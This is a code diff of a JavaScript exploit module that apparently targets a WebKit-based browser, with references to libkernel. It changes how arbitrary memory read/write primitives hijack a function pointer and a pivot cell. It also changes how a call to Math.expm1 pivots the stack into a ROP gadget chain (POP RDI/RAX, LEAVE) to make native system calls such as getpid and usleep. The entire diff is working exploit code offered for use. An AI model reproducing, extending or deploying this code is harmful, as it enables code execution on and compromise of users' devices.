@@ -30,14 +30,9 @@ const GADGET_TABLE = [
 
 export { verifyPivotSet, PIVOT_ROWS };
 
-/** POP + epilogue gadgets used in layoutNativeCall (not covered by verifyPivotSet). */
-const CHAIN_POP_ROWS = [
+/** POP gadgets layoutNativeCall actually uses (not chain_poops argGadget[1..5]). */
+export const CHAIN_POP_ROWS = [
     ["POP_RDI", "wk_POP_RDI_RET", [0x5f, 0xc3]],
-    ["POP_RSI", "wk_POP_RSI_RET", [0x5e, 0xc3]],
-    ["POP_RDX", "wk_POP_RDX_RET", [0x5a, 0xc3]],
-    ["POP_RCX", "wk_POP_RCX_RET", [0x59, 0xc3]],
-    ["POP_R8", "wk_POP_R8_RET", [null, 0x58, 0xc3]],
-    ["POP_R9", "wk_POP_R9_RET", [null, 0x59, 0xc3]],
     ["POP_RAX", "wk_POP_RAX_RET", [0x58, 0xc3]],
     ["LEAVE", "wk_LEAVE_RET", [0xc9, 0xc3]],
 ];
@@ -279,6 +274,54 @@ export function describeSlabLayout(p, prep) {
     };
 }
 
+function pivotHookCell(prep, off) {
+    let hookOff = 0;
+    if (off && off.pivot_hook_off != null)
+        hookOff = off.pivot_hook_off;
+    if (typeof sessionStorage !== "undefined") {
+        try {
+            const q = sessionStorage.getItem("wk-pivot-hook-off");
+            if (q != null && q !== "")
+                hookOff = parseInt(q, 16);
+        } catch (_) { }
+    }
+    return prep.pivotCell.add32(hookOff);
+}
+
+/** Can primitive read slab backing addrs (bad bufAddr → OOM @ G5). */
+export function verifySlabAddrs(p, prep) {
+    if (!prep || !prep.M)
+        throw new Error("verifySlabAddrs: no prep");
+    const M = prep.M;
+    const names = ["S", "P", "K", "F"];
+    const addrs = [M.S, M.P, M.K, M.F];
+    const out = {};
+    for (let i = 0; i < names.length; i++) {
+        let ok = false;
+        try {
+            ok = p.read8(addrs[i]) != null;
+        } catch (_) { ok = false; }
+        out[names[i]] = { addr: addrs[i], ok };
+    }
+    if (prep._layout && prep._layout.rsp) {
+        let ok = false;
+        try {
+            ok = p.read8(prep._layout.rsp) != null;
+        } catch (_) { ok = false; }
+        out.rsp = { addr: prep._layout.rsp, ok };
+    }
+    return out;
+}
+
+function writePivotHook(p, prep, off) {
+    const site = pivotHookCell(prep, off);
+    if (!prep._bisect) prep._bisect = {};
+    prep._bisect.pivotSite = site;
+    prep._bisect.pivotSaved = p.read8(site);
+    p.write8(site, prep.M.S);
+    return site;
+}
+
 /** Swap G5 in live slab (try expm1+0x53642a if table G5 OOMs at fire). */
 export function patchPrepG5(prep, g5Addr) {
     if (!prep || !prep.M || !prep.G || !g5Addr)
@@ -304,11 +347,19 @@ export function bisectArmG0(p, prep) {
     prep.mainArmed = true;
 }
 
-/** Bisect step 4 — pivot cell → store slab S (save old val). */
-export function bisectHookPivot(p, prep) {
+/** Bisect step 4 — pivot hook site → store slab S (save old val). */
+export function bisectHookPivot(p, prep, off) {
     if (!prep || !prep.pivotCell || !prep.M)
         throw new Error("bisectHookPivot: no prep");
+    writePivotHook(p, prep, off || {});
+}
+
+/** Bisect step 4 alt — poops-style hook @ leakval+0 (no +0x30). */
+export function bisectHookPivotPoops(p, prep) {
+    if (!prep || !prep.pivotCell || !prep.M)
+        throw new Error("bisectHookPivotPoops: no prep");
     if (!prep._bisect) prep._bisect = {};
+    prep._bisect.pivotSite = prep.pivotCell;
     prep._bisect.pivotSaved = p.read8(prep.pivotCell);
     p.write8(prep.pivotCell, prep.M.S);
 }
@@ -320,11 +371,12 @@ export function bisectFireExpm1(p, prep) {
     Math.expm1(prep.pivotObj);
 }
 
-/** Bisect step 6 — restore pivot cell + main m_function. */
+/** Bisect step 6 — restore pivot hook site + main m_function. */
 export function bisectRestore(p, prep) {
     if (!prep) return;
+    const site = (prep._bisect && prep._bisect.pivotSite) || prep.pivotCell;
     if (prep._bisect && prep._bisect.pivotSaved != null)
-        p.write8(prep.pivotCell, prep._bisect.pivotSaved);
+        p.write8(site, prep._bisect.pivotSaved);
     if (prep.mainMf && prep.mainOrig)
         p.write8(prep.mainMf, prep.mainOrig);
     prep.mainArmed = false;
@@ -333,47 +385,47 @@ export function bisectRestore(p, prep) {
 }
 
 /** Bisect step 7+ — fire after layout (assumes hook+arm or uses full fireNativeCall). */
-export function fireNativeCallBisect(p, prep) {
-    return fireNativeCall(p, prep);
+export function fireNativeCallBisect(p, prep, off) {
+    return fireNativeCall(p, prep, off);
 }
 
-export function firePivotSmoke(p, prep) {
+export function firePivotSmoke(p, prep, off) {
     if (!prep || !prep.M || !prep.G)
         throw new Error("firePivotSmoke: no prep");
     layoutSmokeStack(prep);
-    return fireNativeCall(p, prep);
+    return fireNativeCall(p, prep, off);
 }
 
 /** chain_poops callAddr — no logging, no DOM. */
-export function fireNativeCall(p, prep) {
+export function fireNativeCall(p, prep, off) {
     if (!prep || !prep.M)
         throw new Error("fireNativeCall: no prep");
     if (!prep.mainArmed) {
         p.write8(prep.mainMf, prep.G.G0);
         prep.mainArmed = true;
     }
-    const saved = p.read8(prep.pivotCell);
-    p.write8(prep.pivotCell, prep.M.S);
+    const site = writePivotHook(p, prep, off || {});
     Math.expm1(prep.pivotObj);
-    p.write8(prep.pivotCell, saved);
+    p.write8(site, prep._bisect.pivotSaved);
     p.write8(prep.mainMf, prep.mainOrig);
     prep.mainArmed = false;
     prep.staged = false;
+    prep._bisect = {};
     return prep.M.frameDv.getUint32(0, true) | 0;
 }
 
 export function fireUsleep(p, prep, libkernelBase, off, usec) {
     stageUsleep(p, prep, libkernelBase, off, usec);
-    return fireNativeCall(p, prep);
+    return fireNativeCall(p, prep, off);
 }
 
-export function fireGetpid(p, prep) {
-    return fireNativeCall(p, prep);
+export function fireGetpid(p, prep, off) {
+    return fireNativeCall(p, prep, off);
 }
 
 export function runGetpidFromPrep(p, prep, libkernelBase, off) {
     stageGetpid(p, prep, libkernelBase, off);
-    return fireGetpid(p, prep);
+    return fireGetpid(p, prep, off);
 }
 
 export function initNativeCall(p, off, opts) {
@@ -391,7 +443,7 @@ export function initNativeCall(p, off, opts) {
             if (num !== SYS.getpid) throw new Error("getpid only");
             if (!prep.staged)
                 stageGetpid(p, prep, lk, off);
-            return { i32: fireGetpid(p, prep) };
+            return { i32: fireGetpid(p, prep, off) };
         },
         disarm() {
             if (prep.staged) {
